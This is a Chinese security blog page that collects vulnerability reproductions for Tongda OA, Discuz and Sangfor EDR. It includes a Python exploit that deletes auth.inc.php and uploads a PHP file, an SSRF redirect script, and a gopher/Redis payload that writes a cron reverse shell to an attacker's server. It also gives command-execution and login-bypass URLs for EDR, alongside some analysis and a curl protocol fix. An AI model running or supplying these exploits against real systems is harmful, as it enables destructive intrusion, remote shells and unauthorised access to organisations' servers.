<p>可以尝试使用变量覆盖</p>
<p>漏洞点在图中最后一个else</p>
<p>$repkid可控，然后传参数时加入../../../跳到别的目录（因为通达OA的nginx配置中，上传文件所在的attachment目录里面的PHP不准访问，因此必须要跳出去）</p>
<p><img src="/2020/09/09/web%E6%B8%97%E9%80%8F/%E9%80%9A%E8%BE%BEOA11-6-preAuth-RCE%E5%88%86%E6%9E%90/getImage-20200909162931777.png" alt="img"></p>
<p>POC如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本POC不是无损利用的，会让对方系统文件被删除导致无法正常工作并且由于目标系统及网络环境不可控，该漏洞也不可能编写出在任何情况下都完全无损的EXP使用时请一定一定要慎重，一定要获取对方书面授权再使用如果仅仅想要检测漏洞的存在性，可以自己编写脚本只检测&#x2F;module&#x2F;appbuilder&#x2F;assets&#x2F;print.php是否存在 import requeststarget&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8203&#x2F;&quot;payload&#x3D;&quot;&lt;?php echo 123456 ?&gt;&quot;print(&quot;[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA&quot;)input(&quot;Press enter to continue&quot;)print(&quot;[*]Deleting auth.inc.php....&quot;) url&#x3D;target+&quot;&#x2F;module&#x2F;appbuilder&#x2F;assets&#x2F;print.php?guid&#x3D;..&#x2F;..&#x2F;..&#x2F;webroot&#x2F;inc&#x2F;auth.inc.php&quot;requests.get(url&#x3D;url)print(&quot;[*]Checking if file deleted...&quot;)url&#x3D;target+&quot;&#x2F;inc&#x2F;auth.inc.php&quot;page&#x3D;requests.get(url&#x3D;url).textif &#39;No input file specified.&#39; not in page:    print(&quot;[-]Failed to deleted auth.inc.php&quot;)    exit(-1)print(&quot;[+]Successfully deleted auth.inc.php!&quot;)print(&quot;[*]Uploading payload...&quot;)url&#x3D;target+&quot;&#x2F;general&#x2F;data_center&#x2F;utils&#x2F;upload.php?action&#x3D;upload&amp;filetype&#x3D;nmsl&amp;repkid&#x3D;&#x2F;.&lt;&gt;.&#x2F;.&lt;&gt;.&#x2F;.&lt;&gt;.&#x2F;&quot;files &#x3D; &#123;&#39;FILE1&#39;: (&#39;hack.php&#39;, payload)&#125;requests.post(url&#x3D;url,files&#x3D;files)url&#x3D;target+&quot;&#x2F;_hack.php&quot;page&#x3D;requests.get(url&#x3D;url).textif &#39;No input file specified.&#39; not in page:    print(&quot;[+]Filed Uploaded Successfully&quot;)    print(&quot;[+]URL:&quot;,url)else:    print(&quot;[-]Failed to upload file&quot;)</span><br></pre></td></tr></table></figure></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-09-09T07:56:45.000Z" title="2020-9-9 15:56:45">2020-09-09</time>发表</span><span class="level-item"><time dateTime="2020-09-14T08:33:30.000Z" title="2020-9-14 16:33:30">2020-09-14</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/recurrent/">漏洞复现</a></span><span class="level-item">9 分钟读完 (大约1384个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/09/web%E6%B8%97%E9%80%8F/SSRF%E5%88%B0GETSHELL/">SSRF到GETSHELL</a></h1><div class="content"><h2 id="SSRF到GET-SHELL（附修复方案）"><a href="#SSRF到GET-SHELL（附修复方案）" class="headerlink" title="SSRF到GET SHELL（附修复方案）"></a>SSRF到GET SHELL（附修复方案）</h2><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><blockquote>
<p>SSRF一般用来探测内网服务，但由于应用层使用的Request服务（curl/file<em>get</em>contents）一般不只是支持HTTP/HTTPS，导致可以深层次利用。</p>
</blockquote>
<h2 id="检测方式"><a href="#检测方式" class="headerlink" title="检测方式"></a>检测方式</h2><blockquote>
<p>PHP和Java的检测方式类似，找到Request的时候URL的入参是否可以外部控制来判断是否存在SSRF。（已加入<a target="_blank" rel="noopener" href="https://github.com/wufeifei/cobra">Cobra</a>扫描规则）</p>
</blockquote>
<h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * file_get_contents SSRF Example</span><br><span class="line"> *</span><br><span class="line"> * @author Feei &lt;wufeifei@wufeifei.com&gt; * @link   http:&#x2F;&#x2F;wufeifei.com&#x2F;ssrf</span><br><span class="line"> *&#x2F;</span><br><span class="line"># 任意文件读取</span><br><span class="line">$url &#x3D; &#39;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;;</span><br><span class="line">echo file_get_contents($url);</span><br><span class="line"></span><br><span class="line"># 操作Redis</span><br><span class="line">$url &#x3D; &#39;dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;info&#39;;</span><br><span class="line">echo file_get_contents($url);</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * CURL SSRF Example</span><br><span class="line"> *</span><br><span class="line"> * @author Feei &lt;wufeifei@wufeifei.com&gt; * @link   http:&#x2F;&#x2F;wufeifei.com&#x2F;ssrf</span><br><span class="line"> *&#x2F;</span><br><span class="line">function curl($url)&#123;  </span><br><span class="line">    $ch &#x3D; curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"># 任意文件读取</span><br><span class="line">$url &#x3D; &#39;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;;</span><br><span class="line">curl($url);</span><br><span class="line"></span><br><span class="line"># 操作Redis</span><br><span class="line">$url &#x3D; &#39;dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;info&#39;;</span><br><span class="line">curl($url);</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>拿常用的Curl举例，Curl默认支持的协议非常多。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl -V</span><br><span class="line">curl 7.47.1 (x86_64-apple-darwin15.3.0) libcurl&#x2F;7.47.1 OpenSSL&#x2F;1.0.2g zlib&#x2F;1.2.8  </span><br><span class="line">Protocols: dict file ftp ftps gopher http https imap imaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp  </span><br><span class="line">Features: IPv6 Largefile NTLM NTLM_WB SSL libz TLS-SRP UnixSockets  </span><br></pre></td></tr></table></figure>
<ul>
<li>dict （操作Redis）</li>
<li>file （任意文件读取）</li>
<li>ftp、ftps （FTP爆破）</li>
<li>tftp（UDP协议扩展）</li>
<li>gopher （操作Redis、Memcached）</li>
<li>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</li>
<li>rtsp</li>
<li>smb/smbs （连接SMB）</li>
<li>telnet - 连接SSH/Telnet</li>
<li>http、https - 内网服务探测<ul>
<li>网络服务探测</li>
<li>ShellShock命令执行</li>
<li>JBOSS远程Invoker war命令执行</li>
<li>Java调试接口命令执行</li>
<li>axis2-admin部署Server命令执行</li>
<li>Jenkins Scripts接口命令执行</li>
<li>Confluence SSRF</li>
<li>Struts2一堆命令执行</li>
<li>counchdb WEB API远程命令执行</li>
<li>mongodb SSRF</li>
<li>docker API远程命令执行</li>
<li>php_fpm/fastcgi 命令执行</li>
<li>tomcat命令执行</li>
<li>Elasticsearch引擎Groovy脚本命令执行</li>
<li>WebDav PUT上传任意文件</li>
<li>WebSphere Admin可部署war间接命令执行</li>
<li>Apache Hadoop远程命令执行</li>
<li>zentoPMS远程命令执行</li>
<li>HFS远程命令执行</li>
<li>glassfish任意文件读取和war文件部署间接命令执行</li>
</ul>
</li>
</ul>
<p>攻击影响获得最大化必须得GET SHELL，通过dict/gopher协议来操作Redis写反弹SHELL是目前最方便的姿势。</p>
<h2 id="使用SSRF操作Redis实战"><a href="#使用SSRF操作Redis实战" class="headerlink" title="使用SSRF操作Redis实战"></a>使用SSRF操作Redis实战</h2><p>利用@Jannock发现的Discuz中一处SSRF，即可GET SHELL。 也就是说只要你使用了Discuz论坛，那么就可以直接GET SHELL。</p>
<h5 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h5><p>只要有一处SSRF（此处用Discuz举例），既可能造成GET SHELL，获取服务器所有权限。</p>
<h5 id="Discuz的一处SSRF"><a href="#Discuz的一处SSRF" class="headerlink" title="Discuz的一处SSRF"></a>Discuz的一处SSRF</h5><p>Discuz代码中存在一处远程下载图片的action</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># source&#x2F;module&#x2F;forum&#x2F;forum_ajax.php</span><br><span class="line">if(preg_match(&#39;&#x2F;^(http:\&#x2F;\&#x2F;|\.)&#x2F;i&#39;, $imageurl)) &#123;  </span><br><span class="line">    $content &#x3D; dfsockopen($imageurl);</span><br><span class="line">&#125; elseif(preg_match(&#39;&#x2F;^(&#39;.preg_quote(getglobal(&#39;setting&#x2F;attachurl&#39;), &#39;&#x2F;&#39;).&#39;)&#x2F;i&#39;, $imageurl)) &#123;</span><br><span class="line">    $imagereplace[&#39;newimageurl&#39;][] &#x3D; $value[0];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果$imageurl是http开头的，则使用dfsockopen远程访问该链接的图片。</p>
<p>那么就可以通过301跳转到一个内网服务上，用来探测内网信息。</p>
<h5 id="构造探测图片"><a href="#构造探测图片" class="headerlink" title="构造探测图片"></a>构造探测图片</h5><p>通过构造一个远程的伪图片，目的是为了绕过Discuz对入参的检测要求。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;feei.cn&#x2F;301.php  </span><br></pre></td></tr></table></figure>
<p>301.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$ip &#x3D; $_GET[&#39;ip&#39;];</span><br><span class="line">$port &#x3D; $_GET[&#39;port&#39;];</span><br><span class="line">$scheme &#x3D; $_GET[&#39;s&#39;];</span><br><span class="line">$data &#x3D; $_GET[&#39;data&#39;];</span><br><span class="line">header(&quot;Location: $scheme:&#x2F;&#x2F;$ip:$port&#x2F;$data&quot;);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>构造一个跳转到dict://10.11.2.220:6379/vulture.jpg的地址，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;feei.cn&#x2F;301.php?s&#x3D;dict&amp;ip&#x3D;10.11.2.220&amp;port&#x3D;6379&amp;data&#x3D;vulture.jpg  </span><br></pre></td></tr></table></figure>
<p>我们让其301到一个内网ip的6379端口，然后根据整个请求完成的时间不同来判定该服务是否存在（时间在1s以内说明存在，超过超时时间的则目标服务不存在），构造链接如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bbs.xxx.com&#x2F;forum.php?mod&#x3D;ajax&amp;action&#x3D;downremoteimg&amp;message&#x3D;[img]http:&#x2F;&#x2F;feei.cn&#x2F;301.php?s&#x3D;dict%26ip&#x3D;10.11.2.220%26port&#x3D;6379%26data&#x3D;vulture.jpg[&#x2F;img]</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;bbs.xxx.com&#x2F;forum.php?mod&#x3D;ajax&amp;action&#x3D;downremoteimg&amp;message&#x3D;[img]http:&#x2F;&#x2F;feei.cn&#x2F;301.php?s&#x3D;dict%26ip&#x3D;10.11.2.221%26port&#x3D;6379%26data&#x3D;vulture.jpg[&#x2F;img]  </span><br></pre></td></tr></table></figure>
<p>上面链接请求10.11.2.220的80服务只需要100ms，10.11.2.221不存在80服务，返回使用了6s</p>
<h5 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h5><p>通过dict或者gopher都能操作Redis。 @猪猪侠在wooyun上公布的脚本使用的是dict协议，但经过测试并不能写入正确的cron。</p>
<p>我这里使用的是gopher，不需要像dict协议那样多步构造(flushall/set key/set directory/set dbfilename/save)，只需要一个请求就可以GET SHELL。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;&#123;redis_server&#125;:6379&#x2F;_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*&#x2F;1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20&#x2F;dev&#x2F;tcp&#x2F;&#123;your_server&#125;&#x2F;&#123;your_server_listen_port&#125;%200&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a  </span><br></pre></td></tr></table></figure>
<p>只需要让我们的301.php跳到上面地址，即可写入定时任务(cron)，得到反弹SHELL。</p>
<h5 id="其它利用姿势"><a href="#其它利用姿势" class="headerlink" title="其它利用姿势"></a>其它利用姿势</h5><blockquote>
<p>除了写cron拿到SHELL，还有还几种姿势。</p>
</blockquote>
<h5 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h5><p>大部分请求外部资源底层都是基于curl，curl默认支持的协议比较多。</p>
<p>所以只需要通过配置curl禁止使用除http/https以外其它协议即可解决该问题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source&#x2F;function&#x2F;function_filesock.php  </span><br></pre></td></tr></table></figure>
<p>在_dfsockopen方法内增加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);  </span><br></pre></td></tr></table></figure>
<h6 id="验证修复"><a href="#验证修复" class="headerlink" title="验证修复"></a>验证修复</h6><p>在一台内网服务器(10.11.2.220)上开启一个8080端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 8080  </span><br></pre></td></tr></table></figure>
<p>然后访问触发SSRF的地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bbs.xxx.com&#x2F;forum.php?mod&#x3D;ajax&amp;action&#x3D;downremoteimg&amp;message&#x3D;[img]http:&#x2F;&#x2F;feei.cn&#x2F;301.php?s&#x3D;dict%26ip&#x3D;10.11.2.220%26port&#x3D;8080%26data&#x3D;helo.jpg[&#x2F;img]  </span><br></pre></td></tr></table></figure>
<p>查看是否有请求的回显，没有则说明修复好了</p>
<blockquote>
<p>转自<a target="_blank" rel="noopener" href="https://docs.ioin.in/writeup/wufeifei.com/_ssrf_/index.html">https://docs.ioin.in/writeup/wufeifei.com/_ssrf_/index.html</a></p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2020-09-09T07:45:08.000Z" title="2020-9-9 15:45:08">2020-09-09</time>发表</span><span class="level-item"><time dateTime="2020-09-09T08:09:26.000Z" title="2020-9-9 16:09:26">2020-09-09</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/recurrent/">漏洞复现</a></span><span class="level-item">3 分钟读完 (大约386个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/09/web%E6%B8%97%E9%80%8F/%E6%B7%B1%E4%BF%A1%E6%9C%8Dedr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">深信服edr漏洞分析</a></h1><div class="content"><h1 id="EDR简介"><a href="#EDR简介" class="headerlink" title="EDR简介"></a>EDR简介</h1><p>终端检测响应平台（EDR）是深信服公司提供的一套终端安全解决方案，方案由轻量级的端点安全软件（Agent）和管理平台（MGR）共同组成。</p>
<p>漏洞复现：</p>
<h1 id="远程命令执行漏洞CNVD-2020-46552"><a href="#远程命令执行漏洞CNVD-2020-46552" class="headerlink" title="远程命令执行漏洞CNVD-2020-46552"></a>远程命令执行漏洞CNVD-2020-46552</h1><p><a target="_blank" rel="noopener" href="https://ip+端口/tool/log/c.php?strip_slashes=system&amp;host=id">https://ip+端口/tool/log/c.php?strip_slashes=system&amp;host=id</a></p>
<p><img src="/2020/09/09/web%E6%B8%97%E9%80%8F/%E6%B7%B1%E4%BF%A1%E6%9C%8Dedr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/getImage-20200909154516622.png" alt="img"></p>
<p>漏洞分析：</p>
<p>将c.php中的文件进行分析</p>
<p><img src="/2020/09/09/web%E6%B8%97%E9%80%8F/%E6%B7%B1%E4%BF%A1%E6%9C%8Dedr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/getImage-20200909154516609.png" alt="img"></p>
<p>$_REQUEST将传入的参数保存为数组，将前台的参数传入到$show_form</p>
<p>进入$show_form</p>
<p><img src="/2020/09/09/web%E6%B8%97%E9%80%8F/%E6%B7%B1%E4%BF%A1%E6%9C%8Dedr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/getImage.png" alt="img"></p>
<p>使用了匿名函数，use调用了外部变量$strip_slashes、$show_input</p>
<p>extract()函数会从数组中将变量导入到当前的符号表。他会把数组变成变量，函数使用数组的键名为变量名，键值为变量值</p>
<p>$host是如果存在就执行$strip_slashes($host)</p>
<p>那么传参数的时候使用:strip_slashes=system&amp;host=id</p>
<p><img src="/2020/09/09/web%E6%B8%97%E9%80%8F/%E6%B7%B1%E4%BF%A1%E6%9C%8Dedr%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/getImage-20200909154517340.png" alt="img"></p>
<p>strip_slashes函数的作用是去掉&amp;变量中的\ </p>
<h1 id="后台任意用户登陆漏洞"><a href="#后台任意用户登陆漏洞" class="headerlink" title="后台任意用户登陆漏洞"></a><strong>后台任意用户登陆漏洞</strong></h1><p>只要用户存在直接就可以登录</p>
<p><a href="https://ip:xx/ui/login.php?user=任意用户名，如https://ip:xx/ui/login.php?user=admin">https://ip:xx/ui/login.php?user=任意用户名，如https://ip:xx/ui/login.php?user=admin</a></p>
<blockquote>
<p>来源：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32393893/article/details/108077482">https://blog.csdn.net/qq_32393893/article/details/108077482</a></p>
</blockquote>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/categories/recurrent/page/0/">上一页</a></div><div class="pagination-next"><a href="/categories/recurrent/page/2/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/categories/recurrent/">1</a></li><li><a class="pagination-link" href="/categories/recurrent/page/2/">2</a></li><li><a class="pagination-link" href="/categories/recurrent/page/3/">3</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar is-rounded" src="/img/avatar.png" alt="B0urne"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">B0urne</p><p class="is-size-6 is-block">渗透测试/WEB安全</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>BeiJing</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">81</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">21</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">37</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="http://www.ol4three.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">oldthree</span></span><span class="level-right"><span class="level-item tag">www.ol4three.com</span></span></a></li><li><a class="level is-mobile" href="http://blog.leanote.com/xcniao@foxmail.com" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">XCniao</span></span><span class="level-right"><span class="level-item tag">blog.leanote.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Android/"><span class="level-start"><span class="level-item">Android</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/Mac/"><span class="level-start"><span class="level-item">Mac</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/SQL%E6%B3%A8%E5%85%A5/"><span class="level-start"><span class="level-item">SQL注入</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/SpringBoot/"><span class="level-start"><span class="level-item">SpringBoot</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/XSS/"><span class="level-start"><span class="level-item">XSS</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/hexo/"><span class="level-start"><span class="level-item">hexo</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/linux/"><span class="level-start"><span class="level-item">linux</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/python/"><span class="level-start"><span class="level-item">python</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/web%E6%B8%97%E9%80%8F/"><span class="level-start"><span class="level-item">web渗透</span></span><span class="level-end"><span class="level-item tag">21</span></span></a></li><li><a class="level is-mobile" href="/categories/windows/"><span class="level-start"><span class="level-item">windows</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E4%BA%BA%E7%94%9F%E6%84%9F%E6%82%9F/"><span class="level-start"><span class="level-item">人生感悟</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%9B%E9%98%B6/"><span class="level-start"><span class="level-item">博客搭建进阶</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%8F%90%E6%9D%83/"><span class="level-start"><span class="level-item">提权</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"><span class="level-start"><span class="level-item">文件上传</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8E%9F%E7%90%86/"><span class="level-start"><span class="level-item">服务器原理</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="level-start"><span class="level-item">渗透测试</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/recurrent/"><span class="level-start"><span class="level-item">漏洞复现</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"><span class="level-start"><span class="level-item">漏洞挖掘</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%BB%95%E8%BF%87/"><span class="level-start"><span class="level-item">绕过</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"><span class="level-start"><span class="level-item">问题汇总</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E9%9D%A2%E8%AF%95/"><span class="level-start"><span class="level-item">面试</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-16T08:46:18.000Z">2021-03-16</time></p><p class="title"><a href="/2021/03/16/OpenSSH%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE-CVE-2018-15473/">OpenSSH用户名枚举_CVE-2018-15473</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-16T08:46:08.000Z">2021-03-16</time></p><p class="title"><a href="/2021/03/16/OpenSSHy%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE-CVE-2018-15473/">OpenSSHy用户名枚举_CVE-2018-15473</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-02-01T07:39:36.000Z">2021-02-01</time></p><p class="title"><a href="/2021/02/01/CVE-2021-3156-Sudo%E6%8F%90%E6%9D%83/">CVE-2021-3156 Sudo提权</a></p><p class="categories"><a href="/categories/%E6%8F%90%E6%9D%83/">提权</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-29T05:24:31.000Z">2021-01-29</time></p><p class="title"><a href="/2021/01/29/Selenium%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">Selenium使用教程</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-01-29T04:22:09.000Z">2021-01-29</time></p><p class="title"><a href="/2021/01/29/FckEditor%E7%BC%96%E8%BE%91%E5%99%A8%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9Egetshel%E6%80%BB%E7%BB%93/">FckEditor编辑器上传漏洞getshel总结</a></p><p class="categories"><a href="/categories/web%E6%B8%97%E9%80%8F/">web渗透</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" 